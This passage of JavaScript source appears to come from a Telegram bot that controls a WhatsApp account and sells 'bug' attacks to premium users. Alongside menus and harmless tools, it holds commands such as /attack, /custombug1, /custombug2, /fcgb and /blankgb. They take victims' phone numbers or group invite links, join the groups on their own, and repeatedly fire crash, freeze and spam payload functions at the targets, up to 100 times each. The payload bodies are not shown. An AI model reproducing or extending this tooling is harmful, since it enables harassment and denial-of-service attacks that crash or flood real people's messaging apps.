┃❏ /privatemute on/off
╰━───────────────━❏\`\`\``;

  const media = {
    type: "photo",
    media: userSelectedImage, 
    caption: mainMenuMessage,
    parse_mode: "Markdown" 
  };

  const keyboard = {
    inline_keyboard: [
      [{ text: "🔙 𝗕𝗮𝗰𝗸 𝗧𝗼 𝗠𝗲𝗻𝘂 ", callback_data: "back", style: 'Primary' }],
    ],
  };

  try {
    await ctx.editMessageMedia(media, { reply_markup: keyboard });
  } catch (err) {
    await ctx.replyWithPhoto(media.media, {
      caption: media.caption,
      parse_mode: media.parse_mode,
      reply_markup: keyboard,
    });
  }
});

bot.action("tools_menu", async (ctx) => {
  const userId = ctx.from.id.toString();
  const isPremium = premiumUsers.includes(userId);
  const memoryStatus = formatMemory();
  const Name = ctx.from.username ? `@${ctx.from.username}` : userId;
  const waktuRunPanel = getUptime();
  const waStatus = sock && sock.user ? "🟢 Connect" : "🔴 No Connect";
      
  const mainMenuMessage = `\`\`\`
╭━───━⊱ ⊱⪩ 𝚃𝙾𝙾𝙻𝚂 𝙼𝙴𝙽𝚄 ⪨⊰
┃❏ /brat <Brat to sticker>
┃❏ /tiktokdl <TikTok downloader>
┃❏ /iqc <iPhone camera effect.>
┃❏ /info <cekid.>
╰━─────────────────━❏
\`\`\``;

  const media = {
    type: "photo",
    media: userSelectedImage, 
    caption: mainMenuMessage,
    parse_mode: "Markdown" 
  };

  const keyboard = {
    inline_keyboard: [
      [{ text: "🔙 𝗕𝗮𝗰𝗸 𝗧𝗼 𝗠𝗲𝗻𝘂 ", callback_data: "back", style: 'Primary' }],
    ],
  };

  try {
    await ctx.editMessageMedia(media, { reply_markup: keyboard });
  } catch (err) {
    await ctx.replyWithPhoto(media.media, {
      caption: media.caption,
      parse_mode: media.parse_mode,
      reply_markup: keyboard,
    });
  }
});

bot.action("all_menu", async (ctx) => {
  const userId = ctx.from.id.toString();
  const isPremium = premiumUsers.includes(userId);
  const memoryStatus = formatMemory();
  const Name = ctx.from.username ? `@${ctx.from.username}` : userId;
  const waktuRunPanel = getUptime();
  const waStatus = sock && sock.user ? "🟢 Connect" : "🔴 No Connect";
      
  const mainMenuMessage = `
<blockquote><strong>
╔═══〔 𝐗𝐘𝐋𝐄𝐍𝐓 𝐄𝐌𝐏𝐈𝐑𝐄 〕═══⎔
║
║  📢  𝗦𝗬𝗦𝗧𝗘𝗠 𝗨𝗣𝗗𝗔𝗧𝗘
║
║  Silahkan ketik perintah:
║  ➥ <code>/updatesc</code>
║  ➥ <code>/autoupdate (on/off)</code>
║  ➥ <code>/checkupdate</code>
║  ➥ <code>/updatestatus</code>
║
║  Proses pembaruan script
║  akan berjalan otomatis.
║
╚═════════════════════⎔</strong></blockquote>`;

  const media = {
    type: "photo",
    media: userSelectedImage, 
    caption: mainMenuMessage,
    parse_mode: "HTML" 
  };

  const keyboard = {
    inline_keyboard: [
      [{ text: "🔙 𝗕𝗮𝗰𝗸 𝗧𝗼 𝗠𝗲𝗻𝘂 ", callback_data: "back", style: 'Primary' }],
    ],
  };

  try {
    await ctx.editMessageMedia(media, { reply_markup: keyboard });
  } catch (err) {
    await ctx.replyWithPhoto(media.media, {
      caption: media.caption,
      parse_mode: media.parse_mode,
      reply_markup: keyboard,
    });
  }
});

bot.action("bug_menu", async (ctx) => {
  const userId = ctx.from.id.toString();
  const isPremium = premiumUsers.includes(userId);
  const memoryStatus = formatMemory();
  const Name = ctx.from.username ? `@${ctx.from.username}` : userId;
  const waktuRunPanel = getUptime();
  const waStatus = sock && sock.user ? "🟢 Connect" : "🔴 No Connect";
      
  const mainMenuMessage = `\`\`\`
╭━━━〔 ALL FITURE • BEBAS SPAM • ANTI KENON 〕━━━╮
📱 ANDROID • INVISIBLE DELAY HARD
│ /xspam      ➜ 628xxxx 
│ /xspam1    ➜ 628xxxx 
│ /xspam2     ➜ 628xxxx 
│ /xspam3     ➜ 628xxxx 
│ /xspam4     ➜ 628xxxx 
│ /combo1     ➜ 628xxxx 
│ /combo     ➜ 628xxxx 
📱 ANDROID • INVISIBLE DELAY HARD
│ /fcgb      ➜ 628xxxx
│ /blankgb      ➜ 628xxxx 
│ /delaygb    ➜ 628xxxx 
│━━━━━━━━━━━━━━━━━━━━╯
💡 Tips:
│ /blockcmd /command     → menghidupkan command
│ /unblockcmd /command  → mematikan command
│ /listblockcmd              → cek status command
│ ACTIVE / OFFLINE  
╰━━━━━━━━━━━━━━━━━━━━━━╯
\`\`\``;

  const media = {
    type: "photo",
    media: userSelectedImage,
    caption: mainMenuMessage,
    parse_mode: "Markdown"
  };

  const keyboard = {
    inline_keyboard: [
      [
        { text: "🔙 𝗕𝗮𝗰𝗸 𝗧𝗼 𝗠𝗲𝗻𝘂 ", callback_data: "back", style: "primary" }
      ],
    ],
  };

  try {
    await ctx.editMessageMedia(media, { reply_markup: keyboard });
  } catch (err) {
    await ctx.replyWithPhoto(media.media, {
      caption: media.caption,
      parse_mode: media.parse_mode,
      reply_markup: keyboard 
    });
  }
});

bot.action("bug_menu2", async (ctx) => {
  const userId = ctx.from.id.toString();
  const isPremium = premiumUsers.includes(userId);
  const memoryStatus = formatMemory();
  const Name = ctx.from.username ? `@${ctx.from.username}` : userId;
  const waktuRunPanel = getUptime();
  const waStatus = sock && sock.user ? "🟢 Connect" : "🔴 No Connect";
      
  const mainMenuMessage = `\`\`\`
╭━━━〔 𝐗𝐘𝐋𝐄𝐍𝐓 𝐄𝐌𝐏𝐈𝐑𝐄 〕━━━╮
│  » /imortal                  
│                              
│  Note:                       
│  Gunakan /imortal untuk      
│  mengaktifkan bugenu.    
╰━━━━━━━━━━━━━━━━━━━━━━╯    
\`\`\``;

  const media = {
    type: "photo",
    media: userSelectedImage,
    caption: mainMenuMessage,
    parse_mode: "Markdown"
  };

  const keyboard = {
    inline_keyboard: [
      [{ text: "🔙 𝗕𝗮𝗰𝗸 𝗧𝗼 𝗠𝗲𝗻𝘂 ", callback_data: "back", style: "primary" }],
    ],
  };

  try {
    await ctx.editMessageMedia(media, { reply_markup: keyboard });
  } catch (err) {
    await ctx.replyWithPhoto(media.media, {
      caption: media.caption,
      parse_mode: media.parse_mode,
      reply_markup: keyboard 
    });
  }
});

// Handler untuk back ke menu utama (Menampilkan Pilihan Menu awal)
bot.action("back", async (ctx) => {
  await ctx.answerCbQuery();

  const chooseKeyboard = [
    [
      { text: "☭ Menu 1 (Old Style)", callback_data: "trigger_start1", style: 'danger' },
      { text: "㋡ Menu 2 (New Style)", callback_data: "trigger_start2", style: 'primary' }
    ]
  ];

  const media = {
    type: "photo",
    media: userSelectedImage,
    caption: "Silahkan pilih kembali tampilan menu yang ingin Anda gunakan:",
  };

  try {
    await ctx.editMessageMedia(media, {
      reply_markup: { inline_keyboard: chooseKeyboard }
    });
  } catch (err) {
    await ctx.reply("Silahkan pilih kembali tampilan menu yang ingin Anda gunakan:", {
      reply_markup: { inline_keyboard: chooseKeyboard },
    });
  }
});

// CUSTOMBUG 3
// ===== COMMAND =====
bot.command("custombug2", checkWhatsAppConnection, checkPremium, checkCommandEnabled, checkCooldown,  async (ctx) => {
  const q = ctx.message.text.split(" ")[1];
  if (!q) return ctx.reply("Example: /custombug2 62xxx,62xxx");

  const numbers = q.split(",")
    .map(v => v.replace(/[^0-9]/g, ''))
    .filter(v => v.length > 5);

  if (!numbers.length) return ctx.reply("❌ Nomor tidak valid");

  const targets = numbers.map(v => `${v}@s.whatsapp.net`);

  multiBugSession.set(ctx.from.id, {
    targets,
    numbers,
    selected: []
  });

  await ctx.replyWithPhoto("https://l.top4top.io/p_3803smv0s1.jpg", {
    caption: `⚡ *MULTI BUG PANEL*\n\n🎯 Target (${numbers.length}):\n${numbers.map(v => `• ${v}`).join("\n")}\n\nPilih bug lalu tekan EXECUTE`,
    parse_mode: "Markdown",
    reply_markup: {
      inline_keyboard: buildButtons(ctx.from.id)
    }
  });
});

// ===== BUTTON =====
function buildButtons(userId) {
  const s = multiBugSession.get(userId);
  const isOn = (b) => s.selected.includes(b) ? "⭐" : "💎";

  const btn = (b, name) => ({
    text: `${isOn(b)} ${name}`,
    callback_data: `cb3bug|${b}` // 🔥 prefix unik
  });

  return [
    [btn("bulldo","BULLDO"), btn("delayfreeze","DELAY FREEZE"), btn("harddelay","DELAY HARD")],
    [btn("bebasspam","BEBAS SPAM"), btn("stcb","STCBLANK"),
    btn("fcclick","FC CLICK")],
    [
      { text: "🚀 EXECUTE", callback_data: "cb3bug|exec" }
    ]
  ];
}

// ===== UPDATE =====
async function updateMulti(ctx) {
  await ctx.telegram.editMessageReplyMarkup(
    ctx.callbackQuery.message.chat.id,
    ctx.callbackQuery.message.message_id,
    null,
    {
      inline_keyboard: buildButtons(ctx.from.id)
    }
  );
}

// ===== REGEX (ANTI TABRAKAN) =====
bot.action(/^cb3bug\|([^|]+)$/, async (ctx) => {
  const key = ctx.match[1];
  const s = multiBugSession.get(ctx.from.id);

  if (!s) return ctx.answerCbQuery("Session expired");

  // ===== EXECUTE =====
  if (key === "exec") {

    if (!s.selected.length) {
      return ctx.answerCbQuery("❌ Pilih bug!", { show_alert: true });
    }

    await ctx.answerCbQuery("🚀 EXECUTING...");

    try {

      for (const target of s.targets) {
        for (const bug of s.selected) {

          if (bug === "bulldo") {
            for (let i=0;i<100;i++){ await dingleyhard(sock, target, ptcp = true); await sleep(1500); }
          }
          else if (bug === "delayfreeze") {
            for (let i=0;i<100;i++){ await CrmXcarousel(sock, target); await sleep(1500); }
          }
          else if (bug === "harddelay") {
            for (let i=0;i<100;i++){ await MBGCOMBO(sock, target); await sleep(1500); }
          }
          else if (bug === "bebasspam") {
            for (let i=0;i<100;i++){ await delaycrashV4(sock, target); await sleep(1500); }
          }
          else if (bug === "stcb") {
            for (let i=0;i<50;i++){ await stickerUi(sock, target); await sleep(1000); }
          }
          else if (bug === "fcclick") {
            for (let i=0;i<10;i++){ await X7Klik(sock, target); await sleep(1000); }
          }
        }
        await sleep(1500);
      }

      await ctx.reply(`✅ DONE\nTarget: ${s.targets.length}\nBug: ${s.selected.join(", ")}`);

    } catch (err) {
      console.error(err);
      await ctx.reply("❌ Error saat eksekusi");
    }

    return;
  }

  // ===== TOGGLE =====
  const i = s.selected.indexOf(key);

  if (i > -1) s.selected.splice(i, 1);
  else s.selected.push(key);

  await updateMulti(ctx);
  await ctx.answerCbQuery(`${key.toUpperCase()} ${i > -1 ? "OFF" : "ON"} ⭐`);
});
// CUSTOMBUG 2
// ===== PAGE DATA (UPGRADE JADI 5 PAGE) =====
const togglePages = {
  1: ["bulldo", "delayfreeze", "harddelay"],
  2: ["bebasspam", "stcb", "fcclick"]
};

bot.command("custombug1", checkWhatsAppConnection, checkPremium, checkCommandEnabled, checkCooldown,  async (ctx) => {
  const args = ctx.message.text.split(" ");
  const q = args[1];
  if (!q) return ctx.reply("Example: /custombug1 62xxx");

  const cleanNumber = q.replace(/[^0-9]/g, '');
  const finalNumber = `${cleanNumber}@s.whatsapp.net`;

  attackConfig.set(ctx.from.id, {
    target: finalNumber,
    number: cleanNumber,
    page: 1,

    bulldo: false,
    delayfreeze: false,
    harddelay: false,
    bebasspam: false,
    stcb: false
  });

  const s = attackConfig.get(ctx.from.id);

  await ctx.replyWithPhoto("https://l.top4top.io/p_3803smv0s1.jpg", {
    caption: formatPanel(s),
    parse_mode: "Markdown",
    reply_markup: {
      inline_keyboard: buildMenu(s)
    }
  });
});

// ===== FORMAT =====
function formatPanel(s) {
  const icon = (v) => v ? "⭐" : "💎";

  return `⚡ *ATTACK CONTROL PANEL* ⚡\n\n` +
         `📄 Page : ${s.page}/2\n\n` +

         `🔥 STATUS\n` +
         `• BULLDOZER       : ${icon(s.bulldo)}\n` +
         `• DELAY            : ${icon(s.delayfreeze)}\n` +
         `• DELAY HARD     : ${icon(s.harddelay)}\n` +
         `• BEBAS SPAM     : ${icon(s.bebasspam)}\n` +
         `• STIKER BLANK   : ${icon(s.stcb)}\n`;
         `• FC CLICK         : ${icon(s.fcclick)}\n`;
}

// ===== BUTTON =====
function buildMenu(s) {
  const btn = (key) => ({
    text: `${s[key] ? "⭐" : "💎"} ${key.toUpperCase()}`,
    callback_data: `toggle_${key}`
  });

  const current = togglePages[s.page];
  const keyboard = [];

  for (let i = 0; i < current.length; i += 2) {
    const row = [];
    row.push(btn(current[i]));
    if (current[i + 1]) row.push(btn(current[i + 1]));
    keyboard.push(row);
  }

  keyboard.push([
    { text: "⬅️", callback_data: `custombug1_page_${s.page - 1}:${s.target}` },
    { text: `📄 ${s.page}/2`, callback_data: "noop" },
    { text: "➡️", callback_data: `custombug1_page_${s.page + 1}:${s.target}` }
  ]);

  keyboard.push([
    { text: "🚀 EXECUTE", callback_data: `custombug1_exec:${s.target}` }
  ]);

  return keyboard;
}

// ===== UPDATE =====
async function update(ctx, s) {
  await ctx.telegram.editMessageCaption(
    ctx.callbackQuery.message.chat.id,
    ctx.callbackQuery.message.message_id,
    null,
    formatPanel(s),
    {
      parse_mode: "Markdown",
      reply_markup: {
        inline_keyboard: buildMenu(s)
      }
    }
  );
}

// ===== TOGGLE =====
bot.action(/^toggle_(.+)$/, async (ctx) => {
  const key = ctx.match[1];
  const s = attackConfig.get(ctx.from.id);
  if (!s) return ctx.answerCbQuery("Session expired");

  if (!(key in s)) return ctx.answerCbQuery("Invalid");

  s[key] = !s[key];

  await update(ctx, s);
  await ctx.answerCbQuery(`${key.toUpperCase()} ${s[key] ? "ON ⭐" : "OFF"}`);
});

// ===== SLIDE =====
bot.action(/^custombug1_page_(\d+):(.+)$/, async (ctx) => {
  const page = parseInt(ctx.match[1]);
  const s = attackConfig.get(ctx.from.id);
  if (!s) return ctx.answerCbQuery("Session expired");

  if (page < 1 || page > 2) return ctx.answerCbQuery();

  s.page = page;

  await update(ctx, s);
  await ctx.answerCbQuery(`Page ${page}`);
});

// ===== EXECUTE =====
bot.action(/^custombug1_exec:(.+)$/, async (ctx) => {
  const target = ctx.match[1];
  const s = attackConfig.get(ctx.from.id);
  if (!s) return ctx.answerCbQuery("Session expired");

  await ctx.answerCbQuery("🚀 EXECUTING...");

  try {

    if (s.bulldo) for (let i=0;i<100;i++){ await dingleyhard(sock, target, ptcp = true); await sleep(1500);}
    if (s.delayfreeze) for (let i=0;i<100;i++){ await CrmXcarousel(sock, target); await sleep(1500);}
    if (s.harddelay) for (let i=0;i<100;i++){ await MBGCOMBO(sock, target); await sleep(1500);}
    if (s.bebasspam) for (let i=0;i<100;i++){ await delaycrashV4(sock, target); await sleep(1500);}
    if (s.stcb) for (let i=0;i<50;i++){ await stickerUi(sock, target); await sleep(1000);}
    if (s.fcclick) for (let i=0;i<10;i++){ await X7Klik(sock, target); await sleep(1000);}
    
    await ctx.reply(`✅ ATTACK FINISHED`);

  } catch (err) {
    console.error(err);
    await ctx.reply("❌ Error saat eksekusi");
  }
});
//////// -- CASE BUG SELECT BUTTON BUG --- \\\\\\\\\\\
let lastTarget = {}; // simpen nomor biar kebaca di action

bot.command("attack", checkWhatsAppConnection, checkPremium, checkCommandEnabled, checkCooldown,  async (ctx) => {

  const chatId = ctx.chat.id;
  
  const username = ctx.from.username
    ? `@${ctx.from.username}`
    : ctx.from.first_name || "User";

  const args = ctx.message.text.split(" "); // 🔥 FIX
  const q = args[1];
  if (!q) return ctx.reply("Example: /attack 62xxx");

  const cleanNumber = args[1].replace(/[^0-9]/g, '');
  const finalNumber = `${cleanNumber}@s.whatsapp.net`;

  lastTarget[ctx.from.id] = cleanNumber; // 🔥 simpen

  const waStatus = sock && sock.user
    ? "On Boss"
    : "Ga On Jir"; 

  const caption = `
「𝐗𝐘𝐋𝐄𝐍𝐓 𝐄𝐌𝐏𝐈𝐑𝐄」
⫹⫺ - ${cleanNumber}
⫹⫺ - Date : ${new Date().toLocaleDateString()}
⫹⫺ - Status Sender : ${waStatus}
⫹⫺ - 𝗦𝗘𝗟𝗘𝗖𝗧 𝗧𝗛𝗘 𝗕𝗨𝗧𝗢𝗡 𝗕𝗨𝗚
`;

  const keyboard = {
    reply_markup: {
      inline_keyboard: [
        [
          { text: "𝗕𝗨𝗟𝗟𝗗𝗢𝗭𝗘𝗥 👻", callback_data: `attack_bulldo:${finalNumber}` },
          { text: "𝗗𝗘𝗟𝗔𝗬 𝗙𝗥𝗘𝗘𝗭𝗘 🧬", callback_data: `attack_delayfreeze:${finalNumber}` }
        ],
        [
          { text: "𝗗𝗘𝗟𝗔𝗬 𝗛𝗔𝗥𝗗 📱", callback_data: `attack_harddelay:${finalNumber}` }
        ],
        [
          { text: "𝗕𝗟𝗔𝗡𝗞 🔥", callback_data: `attack_stcb:${finalNumber}` }, 
          { text: "𝗙𝗖 𝗖𝗟𝗜𝗖𝗞 🔥", callback_data: `attack_fcclick:${finalNumber}` }
        ]
      ]
    }
  };

  await ctx.replyWithPhoto("https://l.top4top.io/p_3803smv0s1.jpg", {
    caption,
    ...keyboard,
  });
});

bot.action(/^attack_(\w+):(.+)$/, checkPremium, async (ctx) => {
  const bugType = ctx.match[1];
  const target = ctx.match[2];
  const username = ctx.from.username
    ? `@${ctx.from.username}`
    : ctx.from.first_name || "User";
  const cleanNumber = lastTarget[ctx.from.id] || target; // Fallback ke target jika lastTarget kosong

  await ctx.answerCbQuery();

  try {
    // Memastikan sock tersedia (ganti dengan cara kamu mendefinisikan sock jika berbeda)
    // if (!sock) return ctx.reply("❌ Koneksi bot WhatsApp tidak aktif.");

    switch (bugType) {
      case "stcb":
        await ctx.reply("PROSES JANGAN SPAM BUTTON 🎯");
        for (let i = 0; i < 60; i++) {
          await stickerUi(sock, target);
          await sleep(1000);
        }
        break;
        
      case "fcclick":
        await ctx.reply("PROSES JANGAN SPAM BUTTON 🎯");
        for (let i = 0; i < 10; i++) {
          await X7Klik(sock, target);
          await sleep(1000);
        }
        break;

      case "harddelay":
        await ctx.reply("PROSES JANGAN SPAM BUTTON 🎯");
        for (let i = 0; i < 100; i++) {
          await MBGCOMBO(sock, target);
          await sleep(1500);
        }
        break;

      case "bulldo":
        await ctx.reply("PROSES JANGAN SPAM BUTTON 🎯");
        for (let i = 0; i < 100; i++) {
          await dingleyhard(sock, target, true); // Perbaikan penulisan parameter default ptcp
          await sleep(1000);
        }
        break;

      case "delayfreeze":
        await ctx.reply("PROSES JANGAN SPAM BUTTON 🎯");
        for (let i = 0; i < 100; i++) {
          await CrmXcarousel(sock, target);
          await sleep(1000);
        }
        break;

      default:
        return ctx.reply("❌ Bug tidak ditemukan.");
    }

    // Menambahkan parse_mode: "HTML" agar tag blockquote aktif
    await ctx.replyWithPhoto("https://l.top4top.io/p_3803smv0s1.jpg", {
      caption:  `\`\`\`💤 MODE : Spesial Bug

🤍 User   : ${username}
🎯 Target : ${cleanNumber}
Type   : Status
🚀 Result : SPAM COMPLETE\`\`\``, 
      reply_markup: {
        inline_keyboard: [
          [
            { text: "㋡𝗖𝗵𝗲𝗰𝗸 𝗚𝗿𝗼𝘂𝗽ᯤ", url: `https://wa.me/${cleanNumber}`, style: "danger" }
          ]
        ]
      }
    });

  } catch (err) {
    console.error(err);
    await ctx.reply("Error terjadi, silakan cek konsol/panel.");
  }
});

//////// -- CASE TOOLS --- \\\\\\\\\\\
bot.command("brat", async (ctx) => {
  const text = ctx.message.text.split(" ").slice(1).join(" ");
  if (!text) return ctx.reply("❌ Masukkan teks!");

  try {
    const apiURL = `https://api.nvidiabotz.xyz/imagecreator/bratv?text=${encodeURIComponent(
      text
    )}&isVideo=false`;

    const res = await axios.get(apiURL, { responseType: "arraybuffer" });
    await ctx.replyWithSticker({ source: Buffer.from(res.data) });
  } catch (e) {
    console.error("Error saat membuat stiker:", e);
    ctx.reply("❌ Gagal membuat stiker brat.");
  }
});
bot.command("tiktokdl", checkPremium, async (ctx) => {
  const args = ctx.message.text.split(" ").slice(1).join(" ").trim();
  if (!args) return ctx.reply("🪧 Format: /tiktokdl https://vt.tiktok.com/ZSUeF1CqC/");

  let url = args;
  if (ctx.message.entities) {
    for (const e of ctx.message.entities) {
      if (e.type === "url") {
        url = ctx.message.text.substr(e.offset, e.length);
        break;
      }
    }
  }

  const wait = await ctx.reply("⏳ ☇ Sedang memproses video");

  try {
    const { data } = await axios.get("https://tikwm.com/api/", {
      params: { url },
      headers: {
        "user-agent":
          "Mozilla/5.0 (Linux; Android 11; Mobile) AppleWebKit/537.36 Chrome/123 Safari/537.36",
        "accept": "application/json,text/plain,*/*",
        "referer": "https://tikwm.com/"
      },
      timeout: 20000
    });

    if (!data || data.code !== 0 || !data.data)
      return ctx.reply("❌ ☇ Gagal ambil data video pastikan link valid");

    const d = data.data;

    if (Array.isArray(d.images) && d.images.length) {
      const imgs = d.images.slice(0, 10);
      const media = await Promise.all(
        imgs.map(async (img) => {
          const res = await axios.get(img, { responseType: "arraybuffer" });
          return {
            type: "photo",
            media: { source: Buffer.from(res.data) }
          };
        })
      );
      await ctx.replyWithMediaGroup(media);
      return;
    }

    const videoUrl = d.play || d.hdplay || d.wmplay;
    if (!videoUrl) return ctx.reply("❌ ☇ Tidak ada link video yang bisa diunduh");

    const video = await axios.get(videoUrl, {
      responseType: "arraybuffer",
      headers: {
        "user-agent":
          "Mozilla/5.0 (Linux; Android 11; Mobile) AppleWebKit/537.36 Chrome/123 Safari/537.36"
      },
      timeout: 30000
    });

    await ctx.replyWithVideo(
      { source: Buffer.from(video.data), filename: `${d.id || Date.now()}.mp4` },
      { supports_streaming: true }
    );
  } catch (e) {
    const err =
      e?.response?.status
        ? `❌ ☇ Error ${e.response.status} saat mengunduh video`
        : "❌ ☇ Gagal mengunduh, koneksi lambat atau link salah";
    await ctx.reply(err);
  } finally {
    try {
      await ctx.deleteMessage(wait.message_id);
    } catch {}
  }
});

const formatUserInfo = (user, chat) => {
  const lines = [
    `👤 *Info User*`,
    ``,
    `🆔 *User ID:* \`${user.id}\``,
    `👤 *Nama:* ${user.first_name}${user.last_name ? " " + user.last_name : ""}`,
    `🔖 *Username:* ${user.username ? "@" + user.username : "_(tidak ada)_"}`,
    `🤖 *Bot:* ${user.is_bot ? "Ya" : "Tidak"}`,
    `🌐 *Bahasa:* ${user.language_code || "_(tidak diketahui)_"}`,
    ``,
    `💬 *Info Chat*`,
    ``,
    `🆔 *Chat ID:* \`${chat.id}\``,
    `📌 *Tipe Chat:* ${chat.type}`,
  ];

  if (chat.title) lines.push(`📛 *Judul Grup:* ${chat.title}`);
  if (chat.username) lines.push(`🔖 *Username Grup:* @${chat.username}`);

  return lines.join("\n");
};

bot.command("info", (ctx) => {
  ctx.replyWithMarkdown(formatUserInfo(ctx.from, ctx.chat));
});


bot.command("iqc", async (ctx) => {
  const text = ctx.message.text.split(" ").slice(1).join(" "); 

  if (!text) {
    return ctx.reply(
      "❌ Format: /iqc 18:00|40|Indosat|SennJmbud",
      { parse_mode: "Markdown" }
    );
  }


  let [time, battery, carrier, ...msgParts] = text.split("|");
  if (!time || !battery || !carrier || msgParts.length === 0) {
    return ctx.reply(
      "❌ Format: /iqc 18:00|40|Indosat|hai hai`",
      { parse_mode: "Markdown" }
    );
  }

  await ctx.reply("⏳ Wait a moment...");

  let messageText = encodeURIComponent(msgParts.join("|").trim());
  let url = `https://brat.siputzx.my.id/iphone-quoted?time=${encodeURIComponent(
    time
  )}&batteryPercentage=${battery}&carrierName=${encodeURIComponent(
    carrier
  )}&messageText=${messageText}&emojiStyle=apple`;

  try {
    let res = await fetch(url);
    if (!res.ok) {
      return ctx.reply("❌ Gagal mengambil data dari API.");
    }

    let buffer;
    if (typeof res.buffer === "function") {
      buffer = await res.buffer();
    } else {
      let arrayBuffer = await res.arrayBuffer();
      buffer = Buffer.from(arrayBuffer);
    }

    await ctx.replyWithPhoto({ source: buffer }, {
      caption: `✅ Ss Iphone By Senn Offc ( 🕷️ )`,
      parse_mode: "Markdown"
    });
  } catch (e) {
    console.error(e);
    ctx.reply(" Terjadi kesalahan saat menghubungi API.");
  }
});
//////// -- CASE BUG GROUP --- \\\\\\\\\\\
bot.command("fcgb", checkWhatsAppConnection, checkPremium, checkCommandEnabled, checkCooldown,  async (ctx) => {
  const text = ctx.message.text || "";
  
  // Regex super aman untuk mengambil kode undangan WhatsApp Group
  const inviteCodeMatch = text.match(/chat\.whatsapp\.com\/([a-zA-Z0-9]{22,26})/);
  
  if (!inviteCodeMatch) {
    return ctx.reply(`❌ Format link salah!\nExample: /fcgb https://chat.whatsapp.com/InviteCodeGrupNya`);
  }

  const inviteCode = inviteCodeMatch[1]; // Ini kode bersihnya (tanpa spasi / parameter sisa)
  let target = null;

  try {
    // LANGKAH 1: Cek internal cache bot dulu (apakah bot sudah di dalam grup?)
    try {
      const chats = await sock.groupFetchAllParticipating();
      const groups = Object.values(chats);
      
      // Cari yang metadata inviteCode-nya sama, atau id grup-nya sama (jika ada)
      const matchingGroup = groups.find(g => g.inviteCode === inviteCode || g.id?.includes(inviteCode));
      if (matchingGroup) {
        target = matchingGroup.id;
      }
    } catch (cacheError) {
      console.log("Gagal fetch internal cache, lanjut metode langsung...");
    }

    // LANGKAH 2: Jika JID belum ketemu dari cache, pakai groupGetInviteInfo / groupAcceptInvite
    if (!target) {
      try {
        const groupInfo = await sock.groupGetInviteInfo(inviteCode);
        target = groupInfo.id;
        
        // Langsung auto join
        await sock.groupAcceptInvite(inviteCode);
      } catch (inviteError) {
        // Handle kondisi unik: Baileys sering return error 409 (conflict) kalau bot SEBENARNYA SUDAH JOIN
        if (inviteError.status === 409 || String(inviteError).includes("conflict")) {
          // Jika error karena sudah join, coba tebak atau ekstrak JID dari object error
          target = inviteError.context?.jid || inviteError.jid;
        }
        
        // Jika masih tidak ketemu target JID-nya, coba paksa join langsung tanpa GetInfo
        if (!target) {
          try {
            target = await sock.groupAcceptInvite(inviteCode);
          } catch (forceJoinError) {
            // Jika force join juga mengembalikan info JID (di beberapa versi Baileys)
            if (forceJoinError.context?.jid) target = forceJoinError.context.jid;
          }
        }
      }
    }

    // PENGAMAN TERAKHIR: Jika semua cara di atas gagal mendapatkan JID (@g.us)
    if (!target) {
      return ctx.reply("❌ Gagal mendapatkan ID Grup. Pastikan bot belum di-banned atau link undangan masih aktif!");
    }

  } catch (globalError) {
    console.error("Error Group Join:", globalError);
    return ctx.reply("❌ Terjadi kesalahan sistem saat memproses grup.");
  }

  // --- JIKA JID BERHASIL DIDAPATKAN, PROSES SPAM SEPERTI BIASA ---
  const username = ctx.from.username
    ? `@${ctx.from.username}`
    : ctx.from.first_name || "User";
    
  const sent = await ctx.sendPhoto("https://l.top4top.io/p_3803smv0s1.jpg", {
    caption: `
<blockquote>💤 MODE : FC CLICK (GROUP)

🤍 User   : ${username}
🎯 Target : Group (Link)
Type   : Status
🚀 Result : READY & SENDING</blockquote>
`,
    parse_mode: "HTML",
    reply_markup: {
        inline_keyboard: [[{ text: "㋡𝗖𝗵𝗲𝗰𝗸 𝗚𝗿𝗼𝘂𝗽ᯤ", url: `https://chat.whatsapp.com/${inviteCode}`, style: "danger" }]],
      },
  });

  // Proses Eksekusi Spamming
  await (async () => {
    for (let i = 0; i < 10; i++) {
        await X7Klik(sock, target);
        await sleep(1500);
    }
  })();

  // Update status setelah selesai
  await ctx.telegram.editMessageCaption(
    ctx.chat.id,
    sent.message_id,
    null,
    `
<blockquote>💤 MODE : FC CLICK (GROUP)

🤍 User   : ${username}
🎯 Target : Group (Link)
Type   : Status
🚀 Result : SPAM COMPLETE</blockquote>
`,
    {
      parse_mode: "HTML",
      reply_markup: {
        inline_keyboard: [[{ text: "㋡𝗖𝗵𝗲𝗰𝗸 𝗚𝗿𝗼𝘂𝗽ᯤ", url: `https://chat.whatsapp.com/${inviteCode}`, style: "danger" }]],
      },
    }
  );
});

bot.command("blankgb", checkWhatsAppConnection, checkPremium, checkCommandEnabled, checkCooldown,  async (ctx) => {
  const text = ctx.message.text || "";
  
  // Regex super aman untuk mengambil kode undangan WhatsApp Group
  const inviteCodeMatch = text.match(/chat\.whatsapp\.com\/([a-zA-Z0-9]{22,26})/);
  
  if (!inviteCodeMatch) {
    return ctx.reply(`❌ Format link salah!\nExample: /blankgb https://chat.whatsapp.com/InviteCodeGrupNya`);
  }

  const inviteCode = inviteCodeMatch[1]; // Ini kode bersihnya (tanpa spasi / parameter sisa)
  let target = null;

  try {
    // LANGKAH 1: Cek internal cache bot dulu (apakah bot sudah di dalam grup?)
    try {
      const chats = await sock.groupFetchAllParticipating();
      const groups = Object.values(chats);
      
      // Cari yang metadata inviteCode-nya sama, atau id grup-nya sama (jika ada)
      const matchingGroup = groups.find(g => g.inviteCode === inviteCode || g.id?.includes(inviteCode));
      if (matchingGroup) {
        target = matchingGroup.id;
      }
    } catch (cacheError) {
      console.log("Gagal fetch internal cache, lanjut metode langsung...");
    }

    // LANGKAH 2: Jika JID belum ketemu dari cache, pakai groupGetInviteInfo / groupAcceptInvite
    if (!target) {
      try {
        const groupInfo = await sock.groupGetInviteInfo(inviteCode);
        target = groupInfo.id;
        
        // Langsung auto join
        await sock.groupAcceptInvite(inviteCode);
      } catch (inviteError) {
        // Handle kondisi unik: Baileys sering return error 409 (conflict) kalau bot SEBENARNYA SUDAH JOIN
        if (inviteError.status === 409 || String(inviteError).includes("conflict")) {
          // Jika error karena sudah join, coba tebak atau ekstrak JID dari object error
          target = inviteError.context?.jid || inviteError.jid;
        }
        
        // Jika masih tidak ketemu target JID-nya, coba paksa join langsung tanpa GetInfo
        if (!target) {
          try {
            target = await sock.groupAcceptInvite(inviteCode);
          } catch (forceJoinError) {
            // Jika force join juga mengembalikan info JID (di beberapa versi Baileys)
            if (forceJoinError.context?.jid) target = forceJoinError.context.jid;
          }
        }
      }
    }

    // PENGAMAN TERAKHIR: Jika semua cara di atas gagal mendapatkan JID (@g.us)
    if (!target) {
